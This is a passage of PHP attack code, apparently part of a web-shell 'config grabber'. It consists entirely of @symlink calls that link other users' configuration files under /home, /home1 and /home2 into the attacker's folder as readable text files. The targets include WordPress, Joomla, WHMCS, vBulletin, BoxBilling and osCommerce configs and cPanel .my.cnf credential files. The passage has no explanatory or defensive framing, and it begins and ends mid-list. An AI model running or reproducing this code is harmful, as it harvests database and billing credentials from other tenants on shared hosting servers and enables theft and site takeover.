    @symlink('/home/'.$user.'/public_html/manage/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home/'.$user.'/public_html/CLIENTSUPPORT/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home/'.$user.'/public_html/ClientSupport/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home/'.$user.'/public_html/Clientsupport/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home/'.$user.'/public_html/clientsupport/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home/'.$user.'/public_html/CHECKOUT/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home/'.$user.'/public_html/Checkout/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home/'.$user.'/public_html/checkout/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home/'.$user.'/public_html/BILLINGS/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home/'.$user.'/public_html/Billings/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home/'.$user.'/public_html/billings/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home/'.$user.'/public_html/BASKET/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home/'.$user.'/public_html/Basket/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home/'.$user.'/public_html/basket/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home/'.$user.'/public_html/SECURE/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home/'.$user.'/public_html/Secure/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home/'.$user.'/public_html/secure/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home/'.$user.'/public_html/SALES/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home/'.$user.'/public_html/Sales/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home/'.$user.'/public_html/sales/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home/'.$user.'/public_html/BILL/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home/'.$user.'/public_html/Bill/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home/'.$user.'/public_html/bill/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home/'.$user.'/public_html/PURCHASE/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home/'.$user.'/public_html/Purchase/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home/'.$user.'/public_html/purchase/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home/'.$user.'/public_html/ACCOUNT/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home/'.$user.'/public_html/Account/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home/'.$user.'/public_html/account/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home/'.$user.'/public_html/USER/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home/'.$user.'/public_html/User/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home/'.$user.'/public_html/user/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home/'.$user.'/public_html/CLIENTS/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home/'.$user.'/public_html/Clients/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home/'.$user.'/public_html/clients/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home/'.$user.'/public_html/BILLINGS/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home/'.$user.'/public_html/Billings/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home/'.$user.'/public_html/billings/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home/'.$user.'/public_html/MY/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home/'.$user.'/public_html/My/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home/'.$user.'/public_html/my/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home/'.$user.'/public_html/secure/whm/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home/'.$user.'/public_html/secure/whmcs/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home/'.$user.'/public_html/panel/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home/'.$user.'/public_html/clientes/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home/'.$user.'/public_html/cliente/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home/'.$user.'/public_html/support/order/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home/'.$user.'/public_html/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home/'.$user.'/public_html/boxbilling/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home/'.$user.'/public_html/box/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home/'.$user.'/public_html/host/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home/'.$user.'/public_html/Host/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home/'.$user.'/public_html/supportes/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home/'.$user.'/public_html/support/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home/'.$user.'/public_html/hosting/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home/'.$user.'/public_html/cart/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home/'.$user.'/public_html/order/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home/'.$user.'/public_html/client/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home/'.$user.'/public_html/clients/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home/'.$user.'/public_html/cliente/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home/'.$user.'/public_html/clientes/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home/'.$user.'/public_html/billing/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home/'.$user.'/public_html/billings/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home/'.$user.'/public_html/my/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home/'.$user.'/public_html/secure/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home/'.$user.'/public_html/support/order/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home/'.$user.'/public_html/includes/dist-configure.php',$user.'-Zencart.txt');
    @symlink('/home/'.$user.'/public_html/zencart/includes/dist-configure.php',$user.'-Zencart.txt');
    @symlink('/home/'.$user.'/public_html/products/includes/dist-configure.php',$user.'-Zencart.txt');
    @symlink('/home/'.$user.'/public_html/cart/includes/dist-configure.php',$user.'-Zencart.txt');
    @symlink('/home/'.$user.'/public_html/shop/includes/dist-configure.php',$user.'-Zencart.txt');
    @symlink('/home/'.$user.'/public_html/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home/'.$user.'/public_html/hostbills/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home/'.$user.'/public_html/host/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home/'.$user.'/public_html/Host/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home/'.$user.'/public_html/supportes/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home/'.$user.'/public_html/support/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home/'.$user.'/public_html/hosting/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home/'.$user.'/public_html/cart/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home/'.$user.'/public_html/order/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home/'.$user.'/public_html/client/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home/'.$user.'/public_html/clients/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home/'.$user.'/public_html/cliente/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home/'.$user.'/public_html/clientes/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home/'.$user.'/public_html/billing/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home/'.$user.'/public_html/billings/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home/'.$user.'/public_html/my/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home/'.$user.'/public_html/secure/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home/'.$user.'/public_html/support/order/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home/'.$user.'/.my.cnf',$user.'-Cpanel.txt');
    @symlink('/home/'.$user.'/public_html/po-content/config.php',$user.'-Popoji.txt');

    //Home1

    @symlink('/home1/'.$user.'/public_html/vb/includes/config.php',$user.'-Vbulletin.txt');
    @symlink('/home1/'.$user.'/public_html/includes/config.php',$user.'-Vbulletin.txt');
    @symlink('/home1/'.$user.'/public_html/forum/includes/config.php',$user.'-Vbulletin.txt');
    @symlink('/home1/'.$user.'/public_html/forums/includes/config.php',$user.'-Vbulletin.txt');
    @symlink('/home1/'.$user.'/public_html/cc/includes/config.php',$user.'-Vbulletin.txt');
    @symlink('/home1/'.$user.'/public_html/inc/config.php',$user.'-MyBB.txt');
    @symlink('/home1/'.$user.'/public_html/includes/configure.php',$user.'-OsCommerce.txt');
    @symlink('/home1/'.$user.'/public_html/shop/includes/configure.php',$user.'-OsCommerce.txt');
    @symlink('/home1/'.$user.'/public_html/os/includes/configure.php',$user.'-OsCommerce.txt');
    @symlink('/home1/'.$user.'/public_html/oscom/includes/configure.php',$user.'-OsCommerce.txt');
    @symlink('/home1/'.$user.'/public_html/products/includes/configure.php',$user.'-OsCommerce.txt');
    @symlink('/home1/'.$user.'/public_html/cart/includes/configure.php',$user.'-OsCommerce.txt');
    @symlink('/home1/'.$user.'/public_html/inc/conf_global.php',$user.'-IPB.txt');
    @symlink('/home1/'.$user.'/public_html/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home1/'.$user.'/public_html/wp/test/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home1/'.$user.'/public_html/blog/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home1/'.$user.'/public_html/beta/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home1/'.$user.'/public_html/portal/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home1/'.$user.'/public_html/site/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home1/'.$user.'/public_html/wp/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home1/'.$user.'/public_html/WP/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home1/'.$user.'/public_html/news/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home1/'.$user.'/public_html/wordpress/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home1/'.$user.'/public_html/test/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home1/'.$user.'/public_html/demo/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home1/'.$user.'/public_html/home/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home1/'.$user.'/public_html/v1/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home1/'.$user.'/public_html/v2/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home1/'.$user.'/public_html/press/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home1/'.$user.'/public_html/new/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home1/'.$user.'/public_html/blogs/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home1/'.$user.'/public_html/configuration.php',$user.'-Joomla.txt');
    @symlink('/home1/'.$user.'/public_html/blog/configuration.php',$user.'-Joomla.txt');
    @symlink('/home1/'.$user.'/public_html/submitticket.php',$user.'-^WHMCS.txt');
    @symlink('/home1/'.$user.'/public_html/cms/configuration.php',$user.'-Joomla.txt');
    @symlink('/home1/'.$user.'/public_html/beta/configuration.php',$user.'-Joomla.txt');
    @symlink('/home1/'.$user.'/public_html/portal/configuration.php',$user.'-Joomla.txt');
    @symlink('/home1/'.$user.'/public_html/site/configuration.php',$user.'-Joomla.txt');
    @symlink('/home1/'.$user.'/public_html/main/configuration.php',$user.'-Joomla.txt');
    @symlink('/home1/'.$user.'/public_html/home/configuration.php',$user.'-Joomla.txt');
    @symlink('/home1/'.$user.'/public_html/demo/configuration.php',$user.'-Joomla.txt');
    @symlink('/home1/'.$user.'/public_html/test/configuration.php',$user.'-Joomla.txt');
    @symlink('/home1/'.$user.'/public_html/v1/configuration.php',$user.'-Joomla.txt');
    @symlink('/home1/'.$user.'/public_html/v2/configuration.php',$user.'-Joomla.txt');
    @symlink('/home1/'.$user.'/public_html/joomla/configuration.php',$user.'-Joomla.txt');
    @symlink('/home1/'.$user.'/public_html/new/configuration.php',$user.'-Joomla.txt');
    @symlink('/home1/'.$user.'/public_html/WHMCS/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home1/'.$user.'/public_html/whmcs1/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home1/'.$user.'/public_html/Whmcs/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home1/'.$user.'/public_html/whmcs/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home1/'.$user.'/public_html/whmcs/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home1/'.$user.'/public_html/WHMC/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home1/'.$user.'/public_html/Whmc/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home1/'.$user.'/public_html/whmc/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home1/'.$user.'/public_html/WHM/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home1/'.$user.'/public_html/Whm/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home1/'.$user.'/public_html/whm/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home1/'.$user.'/public_html/HOST/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home1/'.$user.'/public_html/Host/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home1/'.$user.'/public_html/host/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home1/'.$user.'/public_html/SUPPORTES/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home1/'.$user.'/public_html/Supportes/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home1/'.$user.'/public_html/supportes/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home1/'.$user.'/public_html/domains/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home1/'.$user.'/public_html/domain/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home1/'.$user.'/public_html/Hosting/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home1/'.$user.'/public_html/HOSTING/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home1/'.$user.'/public_html/hosting/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home1/'.$user.'/public_html/CART/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home1/'.$user.'/public_html/Cart/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home1/'.$user.'/public_html/cart/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home1/'.$user.'/public_html/ORDER/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home1/'.$user.'/public_html/Order/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home1/'.$user.'/public_html/order/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home1/'.$user.'/public_html/CLIENT/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home1/'.$user.'/public_html/Client/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home1/'.$user.'/public_html/client/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home1/'.$user.'/public_html/CLIENTAREA/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home1/'.$user.'/public_html/Clientarea/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home1/'.$user.'/public_html/clientarea/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home1/'.$user.'/public_html/SUPPORT/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home1/'.$user.'/public_html/Support/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home1/'.$user.'/public_html/support/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home1/'.$user.'/public_html/BILLING/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home1/'.$user.'/public_html/Billing/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home1/'.$user.'/public_html/billing/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home1/'.$user.'/public_html/BUY/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home1/'.$user.'/public_html/Buy/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home1/'.$user.'/public_html/buy/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home1/'.$user.'/public_html/MANAGE/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home1/'.$user.'/public_html/Manage/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home1/'.$user.'/public_html/manage/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home1/'.$user.'/public_html/CLIENTSUPPORT/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home1/'.$user.'/public_html/ClientSupport/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home1/'.$user.'/public_html/Clientsupport/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home1/'.$user.'/public_html/clientsupport/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home1/'.$user.'/public_html/CHECKOUT/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home1/'.$user.'/public_html/Checkout/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home1/'.$user.'/public_html/checkout/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home1/'.$user.'/public_html/BILLINGS/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home1/'.$user.'/public_html/Billings/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home1/'.$user.'/public_html/billings/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home1/'.$user.'/public_html/BASKET/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home1/'.$user.'/public_html/Basket/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home1/'.$user.'/public_html/basket/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home1/'.$user.'/public_html/SECURE/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home1/'.$user.'/public_html/Secure/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home1/'.$user.'/public_html/secure/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home1/'.$user.'/public_html/SALES/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home1/'.$user.'/public_html/Sales/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home1/'.$user.'/public_html/sales/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home1/'.$user.'/public_html/BILL/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home1/'.$user.'/public_html/Bill/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home1/'.$user.'/public_html/bill/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home1/'.$user.'/public_html/PURCHASE/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home1/'.$user.'/public_html/Purchase/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home1/'.$user.'/public_html/purchase/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home1/'.$user.'/public_html/ACCOUNT/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home1/'.$user.'/public_html/Account/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home1/'.$user.'/public_html/account/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home1/'.$user.'/public_html/USER/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home1/'.$user.'/public_html/User/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home1/'.$user.'/public_html/user/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home1/'.$user.'/public_html/CLIENTS/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home1/'.$user.'/public_html/Clients/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home1/'.$user.'/public_html/clients/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home1/'.$user.'/public_html/BILLINGS/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home1/'.$user.'/public_html/Billings/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home1/'.$user.'/public_html/billings/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home1/'.$user.'/public_html/MY/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home1/'.$user.'/public_html/My/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home1/'.$user.'/public_html/my/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home1/'.$user.'/public_html/secure/whm/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home1/'.$user.'/public_html/secure/whmcs/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home1/'.$user.'/public_html/panel/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home1/'.$user.'/public_html/clientes/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home1/'.$user.'/public_html/cliente/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home1/'.$user.'/public_html/support/order/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home1/'.$user.'/public_html/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home1/'.$user.'/public_html/boxbilling/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home1/'.$user.'/public_html/box/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home1/'.$user.'/public_html/host/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home1/'.$user.'/public_html/Host/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home1/'.$user.'/public_html/supportes/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home1/'.$user.'/public_html/support/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home1/'.$user.'/public_html/hosting/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home1/'.$user.'/public_html/cart/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home1/'.$user.'/public_html/order/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home1/'.$user.'/public_html/client/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home1/'.$user.'/public_html/clients/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home1/'.$user.'/public_html/cliente/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home1/'.$user.'/public_html/clientes/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home1/'.$user.'/public_html/billing/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home1/'.$user.'/public_html/billings/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home1/'.$user.'/public_html/my/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home1/'.$user.'/public_html/secure/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home1/'.$user.'/public_html/support/order/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home1/'.$user.'/public_html/includes/dist-configure.php',$user.'-Zencart.txt');
    @symlink('/home1/'.$user.'/public_html/zencart/includes/dist-configure.php',$user.'-Zencart.txt');
    @symlink('/home1/'.$user.'/public_html/products/includes/dist-configure.php',$user.'-Zencart.txt');
    @symlink('/home1/'.$user.'/public_html/cart/includes/dist-configure.php',$user.'-Zencart.txt');
    @symlink('/home1/'.$user.'/public_html/shop/includes/dist-configure.php',$user.'-Zencart.txt');
    @symlink('/home1/'.$user.'/public_html/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home1/'.$user.'/public_html/hostbills/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home1/'.$user.'/public_html/host/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home1/'.$user.'/public_html/Host/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home1/'.$user.'/public_html/supportes/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home1/'.$user.'/public_html/support/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home1/'.$user.'/public_html/hosting/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home1/'.$user.'/public_html/cart/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home1/'.$user.'/public_html/order/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home1/'.$user.'/public_html/client/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home1/'.$user.'/public_html/clients/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home1/'.$user.'/public_html/cliente/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home1/'.$user.'/public_html/clientes/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home1/'.$user.'/public_html/billing/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home1/'.$user.'/public_html/billings/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home1/'.$user.'/public_html/my/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home1/'.$user.'/public_html/secure/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home1/'.$user.'/public_html/support/order/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home1/'.$user.'/.my.cnf',$user.'-Cpanel.txt');
    @symlink('/home1/'.$user.'/public_html/po-content/config.php',$user.'-Popoji.txt');
    //Home2

    @symlink('/home2/'.$user.'/public_html/vb/includes/config.php',$user.'-Vbulletin.txt');
    @symlink('/home2/'.$user.'/public_html/includes/config.php',$user.'-Vbulletin.txt');
    @symlink('/home2/'.$user.'/public_html/forum/includes/config.php',$user.'-Vbulletin.txt');
    @symlink('/home2/'.$user.'/public_html/forums/includes/config.php',$user.'-Vbulletin.txt');
    @symlink('/home2/'.$user.'/public_html/cc/includes/config.php',$user.'-Vbulletin.txt');
    @symlink('/home2/'.$user.'/public_html/inc/config.php',$user.'-MyBB.txt');
    @symlink('/home2/'.$user.'/public_html/includes/configure.php',$user.'-OsCommerce.txt');
    @symlink('/home2/'.$user.'/public_html/shop/includes/configure.php',$user.'-OsCommerce.txt');
    @symlink('/home2/'.$user.'/public_html/os/includes/configure.php',$user.'-OsCommerce.txt');
    @symlink('/home2/'.$user.'/public_html/oscom/includes/configure.php',$user.'-OsCommerce.txt');
    @symlink('/home2/'.$user.'/public_html/products/includes/configure.php',$user.'-OsCommerce.txt');
    @symlink('/home2/'.$user.'/public_html/cart/includes/configure.php',$user.'-OsCommerce.txt');
    @symlink('/home2/'.$user.'/public_html/inc/conf_global.php',$user.'-IPB.txt');
    @symlink('/home2/'.$user.'/public_html/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home2/'.$user.'/public_html/wp/test/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home2/'.$user.'/public_html/blog/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home2/'.$user.'/public_html/beta/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home2/'.$user.'/public_html/portal/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home2/'.$user.'/public_html/site/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home2/'.$user.'/public_html/wp/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home2/'.$user.'/public_html/WP/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home2/'.$user.'/public_html/news/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home2/'.$user.'/public_html/wordpress/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home2/'.$user.'/public_html/test/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home2/'.$user.'/public_html/demo/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home2/'.$user.'/public_html/home/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home2/'.$user.'/public_html/v1/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home2/'.$user.'/public_html/v2/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home2/'.$user.'/public_html/press/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home2/'.$user.'/public_html/new/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home2/'.$user.'/public_html/blogs/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home2/'.$user.'/public_html/configuration.php',$user.'-Joomla.txt');
    @symlink('/home2/'.$user.'/public_html/blog/configuration.php',$user.'-Joomla.txt');
    @symlink('/home2/'.$user.'/public_html/submitticket.php',$user.'-^WHMCS.txt');
    @symlink('/home2/'.$user.'/public_html/cms/configuration.php',$user.'-Joomla.txt');
    @symlink('/home2/'.$user.'/public_html/beta/configuration.php',$user.'-Joomla.txt');
    @symlink('/home2/'.$user.'/public_html/portal/configuration.php',$user.'-Joomla.txt');
    @symlink('/home2/'.$user.'/public_html/site/configuration.php',$user.'-Joomla.txt');
    @symlink('/home2/'.$user.'/public_html/main/configuration.php',$user.'-Joomla.txt');
    @symlink('/home2/'.$user.'/public_html/home/configuration.php',$user.'-Joomla.txt');
    @symlink('/home2/'.$user.'/public_html/demo/configuration.php',$user.'-Joomla.txt');
    @symlink('/home2/'.$user.'/public_html/test/configuration.php',$user.'-Joomla.txt');
    @symlink('/home2/'.$user.'/public_html/v1/configuration.php',$user.'-Joomla.txt');
    @symlink('/home2/'.$user.'/public_html/v2/configuration.php',$user.'-Joomla.txt');
    @symlink('/home2/'.$user.'/public_html/joomla/configuration.php',$user.'-Joomla.txt');
    @symlink('/home2/'.$user.'/public_html/new/configuration.php',$user.'-Joomla.txt');
    @symlink('/home2/'.$user.'/public_html/WHMCS/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home2/'.$user.'/public_html/whmcs1/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home2/'.$user.'/public_html/Whmcs/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home2/'.$user.'/public_html/whmcs/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home2/'.$user.'/public_html/whmcs/configuration.php',$user.'-WHMCS.txt');
